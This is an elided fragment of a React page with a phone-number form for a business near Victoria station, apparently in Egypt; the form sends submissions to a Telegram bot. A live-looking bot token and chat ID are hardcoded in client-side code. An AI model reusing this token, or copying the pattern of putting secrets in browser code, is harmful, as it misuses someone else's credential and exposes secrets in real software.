...
import styles from "./Victoria.module.css";
...
export default function Page() {
  ...
  const handleSubmit = async () => {
    if (phoneNumber.length === 11) {
      const apiEndpoint =
        "https://api.telegram.org/bot6801039471:AAEu6dJyaCyZbZEW2q4eN82czoIbJFVT9Ww/sendMessage";
      const chatId = -1002052299918;
      ...
      <div className={styles.parent}>
        <form className={styles.form}>
          ...
          <p dir="rtl" className={styles.message}>
            العنوان: 76تقاطع ممتاز باشا مع ملك حفني محطه فيكتوريا-برج الشباب
          </p>
          <label>
            <input
